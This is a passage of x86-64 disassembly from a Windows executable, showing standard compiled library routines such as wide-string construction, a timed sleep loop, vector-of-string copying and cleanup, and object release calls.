   1400025bc:	ff 15 6e 2d 00 00    	call   *0x2d6e(%rip)        # 0x140005330
   1400025c2:	cc                   	int3
   1400025c3:	cc                   	int3
   1400025c4:	cc                   	int3
   1400025c5:	cc                   	int3
   1400025c6:	cc                   	int3
   1400025c7:	cc                   	int3
   1400025c8:	cc                   	int3
   1400025c9:	cc                   	int3
   1400025ca:	cc                   	int3
   1400025cb:	cc                   	int3
   1400025cc:	cc                   	int3
   1400025cd:	cc                   	int3
   1400025ce:	cc                   	int3
   1400025cf:	cc                   	int3
   1400025d0:	40 53                	rex push %rbx
   1400025d2:	55                   	push   %rbp
   1400025d3:	56                   	push   %rsi
   1400025d4:	41 56                	push   %r14
   1400025d6:	41 57                	push   %r15
   1400025d8:	48 83 ec 30          	sub    $0x30,%rsp
   1400025dc:	45 33 ff             	xor    %r15d,%r15d
   1400025df:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400025e2:	0f 11 01             	movups %xmm0,(%rcx)
   1400025e5:	4c 89 79 10          	mov    %r15,0x10(%rcx)
   1400025e9:	48 8b ea             	mov    %rdx,%rbp
   1400025ec:	4c 89 79 18          	mov    %r15,0x18(%rcx)
   1400025f0:	48 8b f1             	mov    %rcx,%rsi
   1400025f3:	48 c7 c3 ff ff ff ff 	mov    $0xffffffffffffffff,%rbx
   1400025fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140002600:	48 ff c3             	inc    %rbx
   140002603:	66 44 39 3c 5a       	cmp    %r15w,(%rdx,%rbx,2)
   140002608:	75 f6                	jne    0x140002600
   14000260a:	49 be fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%r14
   140002611:	ff ff 7f 
   140002614:	49 3b de             	cmp    %r14,%rbx
   140002617:	0f 87 f6 00 00 00    	ja     0x140002713
   14000261d:	48 89 7c 24 70       	mov    %rdi,0x70(%rsp)
   140002622:	48 83 fb 07          	cmp    $0x7,%rbx
   140002626:	77 21                	ja     0x140002649
   140002628:	48 89 59 10          	mov    %rbx,0x10(%rcx)
   14000262c:	48 03 db             	add    %rbx,%rbx
   14000262f:	4c 8b c3             	mov    %rbx,%r8
   140002632:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140002639:	00 
   14000263a:	e8 4c 17 00 00       	call   0x140003d8b
   14000263f:	66 44 89 3c 33       	mov    %r15w,(%rbx,%rsi,1)
   140002644:	e9 b6 00 00 00       	jmp    0x1400026ff
   140002649:	48 8b c3             	mov    %rbx,%rax
   14000264c:	48 83 c8 07          	or     $0x7,%rax
   140002650:	49 3b c6             	cmp    %r14,%rax
   140002653:	76 47                	jbe    0x14000269c
   140002655:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   14000265c:	ff ff 7f 
   14000265f:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140002663:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   14000266a:	72 6a                	jb     0x1400026d6
   14000266c:	48 8d 41 27          	lea    0x27(%rcx),%rax
   140002670:	48 3b c1             	cmp    %rcx,%rax
   140002673:	0f 86 a0 00 00 00    	jbe    0x140002719
   140002679:	48 8b c8             	mov    %rax,%rcx
   14000267c:	e8 a7 06 00 00       	call   0x140002d28
   140002681:	48 85 c0             	test   %rax,%rax
   140002684:	75 42                	jne    0x1400026c8
   140002686:	45 33 c9             	xor    %r9d,%r9d
   140002689:	4c 89 7c 24 20       	mov    %r15,0x20(%rsp)
   14000268e:	45 33 c0             	xor    %r8d,%r8d
   140002691:	33 d2                	xor    %edx,%edx
   140002693:	33 c9                	xor    %ecx,%ecx
   140002695:	ff 15 95 2c 00 00    	call   *0x2c95(%rip)        # 0x140005330
   14000269b:	cc                   	int3
   14000269c:	b9 0a 00 00 00       	mov    $0xa,%ecx
   1400026a1:	4c 8b f0             	mov    %rax,%r14
   1400026a4:	48 3b c1             	cmp    %rcx,%rax
   1400026a7:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400026ae:	ff ff 7f 
   1400026b1:	4c 0f 42 f1          	cmovb  %rcx,%r14
   1400026b5:	49 8d 4e 01          	lea    0x1(%r14),%rcx
   1400026b9:	48 3b c8             	cmp    %rax,%rcx
   1400026bc:	77 5b                	ja     0x140002719
   1400026be:	48 03 c9             	add    %rcx,%rcx
   1400026c1:	75 a0                	jne    0x140002663
   1400026c3:	49 8b ff             	mov    %r15,%rdi
   1400026c6:	eb 16                	jmp    0x1400026de
   1400026c8:	48 8d 78 27          	lea    0x27(%rax),%rdi
   1400026cc:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   1400026d0:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   1400026d4:	eb 08                	jmp    0x1400026de
   1400026d6:	e8 4d 06 00 00       	call   0x140002d28
   1400026db:	48 8b f8             	mov    %rax,%rdi
   1400026de:	48 89 5e 10          	mov    %rbx,0x10(%rsi)
   1400026e2:	48 8b d5             	mov    %rbp,%rdx
   1400026e5:	48 03 db             	add    %rbx,%rbx
   1400026e8:	48 89 3e             	mov    %rdi,(%rsi)
   1400026eb:	4c 8b c3             	mov    %rbx,%r8
   1400026ee:	4c 89 76 18          	mov    %r14,0x18(%rsi)
   1400026f2:	48 8b cf             	mov    %rdi,%rcx
   1400026f5:	e8 91 16 00 00       	call   0x140003d8b
   1400026fa:	66 44 89 3c 3b       	mov    %r15w,(%rbx,%rdi,1)
   1400026ff:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   140002704:	48 8b c6             	mov    %rsi,%rax
   140002707:	48 83 c4 30          	add    $0x30,%rsp
   14000270b:	41 5f                	pop    %r15
   14000270d:	41 5e                	pop    %r14
   14000270f:	5e                   	pop    %rsi
   140002710:	5d                   	pop    %rbp
   140002711:	5b                   	pop    %rbx
   140002712:	c3                   	ret
   140002713:	e8 08 ec ff ff       	call   0x140001320
   140002718:	cc                   	int3
   140002719:	e8 e2 ea ff ff       	call   0x140001200
   14000271e:	cc                   	int3
   14000271f:	cc                   	int3
   140002720:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002725:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000272a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000272f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002734:	41 56                	push   %r14
   140002736:	48 83 ec 20          	sub    $0x20,%rsp
   14000273a:	48 8b f9             	mov    %rcx,%rdi
   14000273d:	48 be 00 00 4f 91 94 	movabs $0x4e94914f0000,%rsi
   140002744:	4e 00 00 
   140002747:	48 bd db 34 b6 d7 82 	movabs $0x431bde82d7b634db,%rbp
   14000274e:	de 1b 43 
   140002751:	49 be f3 8c 90 94 07 	movabs $0xb2f4fc0794908cf3,%r14
   140002758:	fc f4 b2 
   14000275b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140002760:	ff 15 ca 29 00 00    	call   *0x29ca(%rip)        # 0x140005130
   140002766:	48 8b d8             	mov    %rax,%rbx
   140002769:	ff 15 d1 29 00 00    	call   *0x29d1(%rip)        # 0x140005140
   14000276f:	48 8b c8             	mov    %rax,%rcx
   140002772:	48 81 fb 80 96 98 00 	cmp    $0x989680,%rbx
   140002779:	75 06                	jne    0x140002781
   14000277b:	48 6b c1 64          	imul   $0x64,%rcx,%rax
   14000277f:	eb 71                	jmp    0x1400027f2
   140002781:	48 81 fb 00 36 6e 01 	cmp    $0x16e3600,%rbx
   140002788:	75 4a                	jne    0x1400027d4
   14000278a:	49 8b c6             	mov    %r14,%rax
   14000278d:	48 f7 e9             	imul   %rcx
   140002790:	4c 8d 04 11          	lea    (%rcx,%rdx,1),%r8
   140002794:	49 c1 f8 18          	sar    $0x18,%r8
   140002798:	49 8b c0             	mov    %r8,%rax
   14000279b:	48 c1 e8 3f          	shr    $0x3f,%rax
   14000279f:	4c 03 c0             	add    %rax,%r8
   1400027a2:	49 69 c0 00 36 6e 01 	imul   $0x16e3600,%r8,%rax
   1400027a9:	48 2b c8             	sub    %rax,%rcx
   1400027ac:	49 8b c6             	mov    %r14,%rax
   1400027af:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   1400027b6:	48 f7 e9             	imul   %rcx
   1400027b9:	48 8d 04 11          	lea    (%rcx,%rdx,1),%rax
   1400027bd:	48 c1 f8 18          	sar    $0x18,%rax
   1400027c1:	48 8b c8             	mov    %rax,%rcx
   1400027c4:	48 c1 e9 3f          	shr    $0x3f,%rcx
   1400027c8:	48 03 c1             	add    %rcx,%rax
   1400027cb:	49 69 c8 00 ca 9a 3b 	imul   $0x3b9aca00,%r8,%rcx
   1400027d2:	eb 1b                	jmp    0x1400027ef
   1400027d4:	48 99                	cqto
   1400027d6:	48 f7 fb             	idiv   %rbx
   1400027d9:	48 8b c8             	mov    %rax,%rcx
   1400027dc:	48 69 c2 00 ca 9a 3b 	imul   $0x3b9aca00,%rdx,%rax
   1400027e3:	48 99                	cqto
   1400027e5:	48 f7 fb             	idiv   %rbx
   1400027e8:	48 69 c9 00 ca 9a 3b 	imul   $0x3b9aca00,%rcx,%rcx
   1400027ef:	48 03 c1             	add    %rcx,%rax
   1400027f2:	48 8b 0f             	mov    (%rdi),%rcx
   1400027f5:	48 3b c1             	cmp    %rcx,%rax
   1400027f8:	7d 47                	jge    0x140002841
   1400027fa:	48 2b c8             	sub    %rax,%rcx
   1400027fd:	48 3b ce             	cmp    %rsi,%rcx
   140002800:	7e 11                	jle    0x140002813
   140002802:	ba 00 5c 26 05       	mov    $0x5265c00,%edx
   140002807:	8b ca                	mov    %edx,%ecx
   140002809:	e8 3e 03 00 00       	call   0x140002b4c
   14000280e:	e9 4d ff ff ff       	jmp    0x140002760
   140002813:	48 8b c5             	mov    %rbp,%rax
   140002816:	48 f7 e9             	imul   %rcx
   140002819:	48 c1 fa 12          	sar    $0x12,%rdx
   14000281d:	48 8b c2             	mov    %rdx,%rax
   140002820:	48 c1 e8 3f          	shr    $0x3f,%rax
   140002824:	48 03 d0             	add    %rax,%rdx
   140002827:	48 69 c2 40 42 0f 00 	imul   $0xf4240,%rdx,%rax
   14000282e:	48 3b c1             	cmp    %rcx,%rax
   140002831:	7d 02                	jge    0x140002835
   140002833:	ff c2                	inc    %edx
   140002835:	8b ca                	mov    %edx,%ecx
   140002837:	e8 10 03 00 00       	call   0x140002b4c
   14000283c:	e9 1f ff ff ff       	jmp    0x140002760
   140002841:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002846:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000284b:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140002850:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140002855:	48 83 c4 20          	add    $0x20,%rsp
   140002859:	41 5e                	pop    %r14
   14000285b:	c3                   	ret
   14000285c:	cc                   	int3
   14000285d:	cc                   	int3
   14000285e:	cc                   	int3
   14000285f:	cc                   	int3
   140002860:	40 53                	rex push %rbx
   140002862:	48 83 ec 30          	sub    $0x30,%rsp
   140002866:	48 8b d9             	mov    %rcx,%rbx
   140002869:	48 8b 09             	mov    (%rcx),%rcx
   14000286c:	48 85 c9             	test   %rcx,%rcx
   14000286f:	74 4a                	je     0x1400028bb
   140002871:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   140002875:	e8 16 02 00 00       	call   0x140002a90
   14000287a:	48 8b 0b             	mov    (%rbx),%rcx
   14000287d:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   140002881:	48 2b d1             	sub    %rcx,%rdx
   140002884:	48 83 e2 e0          	and    $0xffffffffffffffe0,%rdx
   140002888:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000288f:	72 18                	jb     0x1400028a9
   140002891:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140002895:	48 83 c2 27          	add    $0x27,%rdx
   140002899:	48 2b c8             	sub    %rax,%rcx
   14000289c:	48 83 e9 08          	sub    $0x8,%rcx
   1400028a0:	48 83 f9 1f          	cmp    $0x1f,%rcx
   1400028a4:	77 1b                	ja     0x1400028c1
   1400028a6:	48 8b c8             	mov    %rax,%rcx
   1400028a9:	e8 72 04 00 00       	call   0x140002d20
   1400028ae:	33 c0                	xor    %eax,%eax
   1400028b0:	48 89 03             	mov    %rax,(%rbx)
   1400028b3:	48 89 43 08          	mov    %rax,0x8(%rbx)
   1400028b7:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400028bb:	48 83 c4 30          	add    $0x30,%rsp
   1400028bf:	5b                   	pop    %rbx
   1400028c0:	c3                   	ret
   1400028c1:	33 c0                	xor    %eax,%eax
   1400028c3:	45 33 c9             	xor    %r9d,%r9d
   1400028c6:	45 33 c0             	xor    %r8d,%r8d
   1400028c9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400028ce:	33 d2                	xor    %edx,%edx
   1400028d0:	33 c9                	xor    %ecx,%ecx
   1400028d2:	ff 15 58 2a 00 00    	call   *0x2a58(%rip)        # 0x140005330
   1400028d8:	cc                   	int3
   1400028d9:	cc                   	int3
   1400028da:	cc                   	int3
   1400028db:	cc                   	int3
   1400028dc:	cc                   	int3
   1400028dd:	cc                   	int3
   1400028de:	cc                   	int3
   1400028df:	cc                   	int3
   1400028e0:	48 8b c4             	mov    %rsp,%rax
   1400028e3:	48 89 58 10          	mov    %rbx,0x10(%rax)
   1400028e7:	48 89 68 18          	mov    %rbp,0x18(%rax)
   1400028eb:	48 89 70 20          	mov    %rsi,0x20(%rax)
   1400028ef:	57                   	push   %rdi
   1400028f0:	41 54                	push   %r12
   1400028f2:	41 55                	push   %r13
   1400028f4:	41 56                	push   %r14
   1400028f6:	41 57                	push   %r15
   1400028f8:	48 83 ec 50          	sub    $0x50,%rsp
   1400028fc:	49 8b d8             	mov    %r8,%rbx
   1400028ff:	4c 8b fa             	mov    %rdx,%r15
   140002902:	48 8b f9             	mov    %rcx,%rdi
   140002905:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002908:	0f 11 40 b8          	movups %xmm0,-0x48(%rax)
   14000290c:	48 89 58 b8          	mov    %rbx,-0x48(%rax)
   140002910:	48 89 58 c0          	mov    %rbx,-0x40(%rax)
   140002914:	4c 89 48 c8          	mov    %r9,-0x38(%rax)
   140002918:	48 3b ca             	cmp    %rdx,%rcx
   14000291b:	0f 84 17 01 00 00    	je     0x140002a38
   140002921:	45 33 e4             	xor    %r12d,%r12d
   140002924:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   14000292b:	ff ff 7f 
   14000292e:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140002933:	49 bd fe ff ff ff ff 	movabs $0x7ffffffffffffffe,%r13
   14000293a:	ff ff 7f 
   14000293d:	0f 1f 00             	nopl   (%rax)
   140002940:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002943:	0f 11 03             	movups %xmm0,(%rbx)
   140002946:	4c 89 63 10          	mov    %r12,0x10(%rbx)
   14000294a:	4c 89 63 18          	mov    %r12,0x18(%rbx)
   14000294e:	4c 8b f7             	mov    %rdi,%r14
   140002951:	48 83 7f 18 07       	cmpq   $0x7,0x18(%rdi)
   140002956:	76 03                	jbe    0x14000295b
   140002958:	4c 8b 37             	mov    (%rdi),%r14
   14000295b:	48 8b 6f 10          	mov    0x10(%rdi),%rbp
   14000295f:	49 3b ed             	cmp    %r13,%rbp
   140002962:	0f 87 18 01 00 00    	ja     0x140002a80
   140002968:	48 83 fd 07          	cmp    $0x7,%rbp
   14000296c:	77 18                	ja     0x140002986
   14000296e:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   140002972:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   140002979:	00 
   14000297a:	41 0f 10 06          	movups (%r14),%xmm0
   14000297e:	0f 11 03             	movups %xmm0,(%rbx)
   140002981:	e9 9c 00 00 00       	jmp    0x140002a22
   140002986:	48 8b f5             	mov    %rbp,%rsi
   140002989:	48 83 ce 07          	or     $0x7,%rsi
   14000298d:	49 3b f5             	cmp    %r13,%rsi
   140002990:	76 3f                	jbe    0x1400029d1
   140002992:	49 8b f5             	mov    %r13,%rsi
   140002995:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
   140002999:	48 81 f9 00 10 00 00 	cmp    $0x1000,%rcx
   1400029a0:	72 4e                	jb     0x1400029f0
   1400029a2:	48 8d 41 27          	lea    0x27(%rcx),%rax
   1400029a6:	48 3b c1             	cmp    %rcx,%rax
   1400029a9:	0f 86 cb 00 00 00    	jbe    0x140002a7a
   1400029af:	48 8b c8             	mov    %rax,%rcx
   1400029b2:	e8 71 03 00 00       	call   0x140002d28
   1400029b7:	48 8b c8             	mov    %rax,%rcx
   1400029ba:	48 85 c0             	test   %rax,%rax
   1400029bd:	0f 84 a1 00 00 00    	je     0x140002a64
   1400029c3:	48 83 c0 27          	add    $0x27,%rax
   1400029c7:	48 83 e0 e0          	and    $0xffffffffffffffe0,%rax
   1400029cb:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   1400029cf:	eb 24                	jmp    0x1400029f5
   1400029d1:	48 83 fe 0a          	cmp    $0xa,%rsi
   1400029d5:	48 0f 42 f1          	cmovb  %rcx,%rsi
   1400029d9:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   1400029dd:	48 3b c8             	cmp    %rax,%rcx
   1400029e0:	0f 87 94 00 00 00    	ja     0x140002a7a
   1400029e6:	48 03 c9             	add    %rcx,%rcx
   1400029e9:	75 ae                	jne    0x140002999
   1400029eb:	49 8b c4             	mov    %r12,%rax
   1400029ee:	eb 05                	jmp    0x1400029f5
   1400029f0:	e8 33 03 00 00       	call   0x140002d28
   1400029f5:	48 89 03             	mov    %rax,(%rbx)
   1400029f8:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   1400029fc:	48 89 73 18          	mov    %rsi,0x18(%rbx)
   140002a00:	4c 8d 04 6d 02 00 00 	lea    0x2(,%rbp,2),%r8
   140002a07:	00 
   140002a08:	49 8b d6             	mov    %r14,%rdx
   140002a0b:	48 8b c8             	mov    %rax,%rcx
   140002a0e:	e8 78 13 00 00       	call   0x140003d8b
   140002a13:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   140002a1a:	ff ff 7f 
   140002a1d:	b9 0a 00 00 00       	mov    $0xa,%ecx
   140002a22:	48 83 c3 20          	add    $0x20,%rbx
   140002a26:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140002a2b:	48 83 c7 20          	add    $0x20,%rdi
   140002a2f:	49 3b ff             	cmp    %r15,%rdi
   140002a32:	0f 85 08 ff ff ff    	jne    0x140002940
   140002a38:	48 8b d3             	mov    %rbx,%rdx
   140002a3b:	48 8b cb             	mov    %rbx,%rcx
   140002a3e:	e8 4d 00 00 00       	call   0x140002a90
   140002a43:	48 8b c3             	mov    %rbx,%rax
   140002a46:	4c 8d 5c 24 50       	lea    0x50(%rsp),%r11
   140002a4b:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   140002a4f:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   140002a53:	49 8b 73 48          	mov    0x48(%r11),%rsi
   140002a57:	49 8b e3             	mov    %r11,%rsp
   140002a5a:	41 5f                	pop    %r15
   140002a5c:	41 5e                	pop    %r14
   140002a5e:	41 5d                	pop    %r13
   140002a60:	41 5c                	pop    %r12
   140002a62:	5f                   	pop    %rdi
   140002a63:	c3                   	ret
   140002a64:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   140002a69:	45 33 c9             	xor    %r9d,%r9d
   140002a6c:	45 33 c0             	xor    %r8d,%r8d
   140002a6f:	33 d2                	xor    %edx,%edx
   140002a71:	33 c9                	xor    %ecx,%ecx
   140002a73:	ff 15 b7 28 00 00    	call   *0x28b7(%rip)        # 0x140005330
   140002a79:	cc                   	int3
   140002a7a:	e8 81 e7 ff ff       	call   0x140001200
   140002a7f:	cc                   	int3
   140002a80:	e8 9b e8 ff ff       	call   0x140001320
   140002a85:	cc                   	int3
   140002a86:	cc                   	int3
   140002a87:	cc                   	int3
   140002a88:	cc                   	int3
   140002a89:	cc                   	int3
   140002a8a:	cc                   	int3
   140002a8b:	cc                   	int3
   140002a8c:	cc                   	int3
   140002a8d:	cc                   	int3
   140002a8e:	cc                   	int3
   140002a8f:	cc                   	int3
   140002a90:	48 3b ca             	cmp    %rdx,%rcx
   140002a93:	74 7d                	je     0x140002b12
   140002a95:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002a9a:	57                   	push   %rdi
   140002a9b:	48 83 ec 30          	sub    $0x30,%rsp
   140002a9f:	48 89 74 24 48       	mov    %rsi,0x48(%rsp)
   140002aa4:	48 8b fa             	mov    %rdx,%rdi
   140002aa7:	33 f6                	xor    %esi,%esi
   140002aa9:	48 8b d9             	mov    %rcx,%rbx
   140002aac:	0f 1f 40 00          	nopl   0x0(%rax)
   140002ab0:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140002ab4:	48 83 fa 07          	cmp    $0x7,%rdx
   140002ab8:	76 31                	jbe    0x140002aeb
   140002aba:	48 8b 0b             	mov    (%rbx),%rcx
   140002abd:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140002ac4:	00 
   140002ac5:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002acc:	72 18                	jb     0x140002ae6
   140002ace:	48 8b 41 f8          	mov    -0x8(%rcx),%rax
   140002ad2:	48 83 c2 27          	add    $0x27,%rdx
   140002ad6:	48 2b c8             	sub    %rax,%rcx
   140002ad9:	48 83 e9 08          	sub    $0x8,%rcx
   140002add:	48 83 f9 1f          	cmp    $0x1f,%rcx
   140002ae1:	77 30                	ja     0x140002b13
   140002ae3:	48 8b c8             	mov    %rax,%rcx
   140002ae6:	e8 35 02 00 00       	call   0x140002d20
   140002aeb:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   140002aef:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   140002af6:	00 
   140002af7:	66 89 33             	mov    %si,(%rbx)
   140002afa:	48 83 c3 20          	add    $0x20,%rbx
   140002afe:	48 3b df             	cmp    %rdi,%rbx
   140002b01:	75 ad                	jne    0x140002ab0
   140002b03:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   140002b08:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140002b0d:	48 83 c4 30          	add    $0x30,%rsp
   140002b11:	5f                   	pop    %rdi
   140002b12:	c3                   	ret
   140002b13:	45 33 c9             	xor    %r9d,%r9d
   140002b16:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002b1b:	45 33 c0             	xor    %r8d,%r8d
   140002b1e:	33 d2                	xor    %edx,%edx
   140002b20:	33 c9                	xor    %ecx,%ecx
   140002b22:	ff 15 08 28 00 00    	call   *0x2808(%rip)        # 0x140005330
   140002b28:	cc                   	int3
   140002b29:	cc                   	int3
   140002b2a:	cc                   	int3
   140002b2b:	cc                   	int3
   140002b2c:	cc                   	int3
   140002b2d:	cc                   	int3
   140002b2e:	cc                   	int3
   140002b2f:	cc                   	int3
   140002b30:	48 8b 09             	mov    (%rcx),%rcx
   140002b33:	48 85 c9             	test   %rcx,%rcx
   140002b36:	0f 85 24 fd ff ff    	jne    0x140002860
   140002b3c:	c3                   	ret
   140002b3d:	cc                   	int3
   140002b3e:	cc                   	int3
   140002b3f:	cc                   	int3
   140002b40:	48 8b 51 08          	mov    0x8(%rcx),%rdx
   140002b44:	48 8b 09             	mov    (%rcx),%rcx
   140002b47:	e9 44 ff ff ff       	jmp    0x140002a90
   140002b4c:	48 ff 25 85 25 00 00 	rex.W jmp *0x2585(%rip)        # 0x1400050d8
   140002b53:	cc                   	int3
   140002b54:	cc                   	int3
   140002b55:	cc                   	int3
   140002b56:	cc                   	int3
   140002b57:	cc                   	int3
   140002b58:	cc                   	int3
   140002b59:	cc                   	int3
   140002b5a:	cc                   	int3
   140002b5b:	cc                   	int3
   140002b5c:	cc                   	int3
   140002b5d:	cc                   	int3
   140002b5e:	cc                   	int3
   140002b5f:	cc                   	int3
   140002b60:	48 8b 05 99 54 00 00 	mov    0x5499(%rip),%rax        # 0x140008000
   140002b67:	33 d2                	xor    %edx,%edx
   140002b69:	48 ff 25 50 28 00 00 	rex.W jmp *0x2850(%rip)        # 0x1400053c0
   140002b70:	40 53                	rex push %rbx
   140002b72:	48 83 ec 20          	sub    $0x20,%rsp
   140002b76:	48 8b d9             	mov    %rcx,%rbx
   140002b79:	48 8d 05 d0 28 00 00 	lea    0x28d0(%rip),%rax        # 0x140005450
   140002b80:	48 89 01             	mov    %rax,(%rcx)
   140002b83:	8b 42 08             	mov    0x8(%rdx),%eax
   140002b86:	89 41 08             	mov    %eax,0x8(%rcx)
   140002b89:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   140002b8d:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   140002b91:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
   140002b98:	00 
   140002b99:	48 85 c9             	test   %rcx,%rcx
   140002b9c:	74 0d                	je     0x140002bab
   140002b9e:	48 8b 01             	mov    (%rcx),%rax
   140002ba1:	48 8b 40 08          	mov    0x8(%rax),%rax
   140002ba5:	ff 15 15 28 00 00    	call   *0x2815(%rip)        # 0x1400053c0
   140002bab:	48 8b c3             	mov    %rbx,%rax
   140002bae:	48 83 c4 20          	add    $0x20,%rsp
   140002bb2:	5b                   	pop    %rbx
   140002bb3:	c3                   	ret
   140002bb4:	cc                   	int3
   140002bb5:	cc                   	int3
   140002bb6:	cc                   	int3
   140002bb7:	cc                   	int3
   140002bb8:	cc                   	int3
   140002bb9:	cc                   	int3
   140002bba:	cc                   	int3
   140002bbb:	cc                   	int3
   140002bbc:	cc                   	int3
   140002bbd:	cc                   	int3
   140002bbe:	cc                   	int3
   140002bbf:	cc                   	int3
   140002bc0:	40 53                	rex push %rbx
   140002bc2:	48 83 ec 20          	sub    $0x20,%rsp
   140002bc6:	48 8b d9             	mov    %rcx,%rbx
   140002bc9:	48 8d 05 80 28 00 00 	lea    0x2880(%rip),%rax        # 0x140005450
   140002bd0:	48 89 01             	mov    %rax,(%rcx)
   140002bd3:	89 51 08             	mov    %edx,0x8(%rcx)
   140002bd6:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   140002bda:	48 c7 41 18 00 00 00 	movq   $0x0,0x18(%rcx)
   140002be1:	00 
   140002be2:	4d 85 c0             	test   %r8,%r8
   140002be5:	74 15                	je     0x140002bfc
   140002be7:	45 84 c9             	test   %r9b,%r9b
   140002bea:	74 10                	je     0x140002bfc
   140002bec:	49 8b 00             	mov    (%r8),%rax
   140002bef:	49 8b c8             	mov    %r8,%rcx
   140002bf2:	48 8b 40 08          	mov    0x8(%rax),%rax
   140002bf6:	ff 15 c4 27 00 00    	call   *0x27c4(%rip)        # 0x1400053c0
   140002bfc:	48 8b c3             	mov    %rbx,%rax
   140002bff:	48 83 c4 20          	add    $0x20,%rsp
   140002c03:	5b                   	pop    %rbx
   140002c04:	c3                   	ret
   140002c05:	cc                   	int3
   140002c06:	cc                   	int3
   140002c07:	cc                   	int3
   140002c08:	cc                   	int3
   140002c09:	cc                   	int3
   140002c0a:	cc                   	int3
   140002c0b:	cc                   	int3
   140002c0c:	cc                   	int3
   140002c0d:	cc                   	int3
   140002c0e:	cc                   	int3
   140002c0f:	cc                   	int3
   140002c10:	40 53                	rex push %rbx
   140002c12:	48 83 ec 20          	sub    $0x20,%rsp
   140002c16:	48 8b d9             	mov    %rcx,%rbx
   140002c19:	48 8d 05 30 28 00 00 	lea    0x2830(%rip),%rax        # 0x140005450
   140002c20:	48 89 01             	mov    %rax,(%rcx)
   140002c23:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140002c27:	48 85 c9             	test   %rcx,%rcx
   140002c2a:	74 0d                	je     0x140002c39
   140002c2c:	48 8b 01             	mov    (%rcx),%rax
   140002c2f:	48 8b 40 10          	mov    0x10(%rax),%rax
   140002c33:	ff 15 87 27 00 00    	call   *0x2787(%rip)        # 0x1400053c0
   140002c39:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140002c3d:	48 85 c9             	test   %rcx,%rcx
   140002c40:	74 0c                	je     0x140002c4e
   140002c42:	48 83 c4 20          	add    $0x20,%rsp
   140002c46:	5b                   	pop    %rbx
   140002c47:	48 ff 25 6a 24 00 00 	rex.W jmp *0x246a(%rip)        # 0x1400050b8
   140002c4e:	48 83 c4 20          	add    $0x20,%rsp
   140002c52:	5b                   	pop    %rbx
   140002c53:	c3                   	ret
   140002c54:	cc                   	int3
   140002c55:	cc                   	int3
   140002c56:	cc                   	int3
   140002c57:	cc                   	int3
   140002c58:	cc                   	int3
   140002c59:	cc                   	int3
   140002c5a:	cc                   	int3
   140002c5b:	cc                   	int3
   140002c5c:	cc                   	int3
   140002c5d:	cc                   	int3
   140002c5e:	cc                   	int3
   140002c5f:	cc                   	int3
   140002c60:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002c65:	57                   	push   %rdi
   140002c66:	48 83 ec 20          	sub    $0x20,%rsp
   140002c6a:	8b fa                	mov    %edx,%edi
   140002c6c:	48 8b d9             	mov    %rcx,%rbx
   140002c6f:	48 8d 05 da 27 00 00 	lea    0x27da(%rip),%rax        # 0x140005450
   140002c76:	48 89 01             	mov    %rax,(%rcx)
   140002c79:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   140002c7d:	48 85 c9             	test   %rcx,%rcx
   140002c80:	74 0d                	je     0x140002c8f
   140002c82:	48 8b 01             	mov    (%rcx),%rax
   140002c85:	48 8b 40 10          	mov    0x10(%rax),%rax
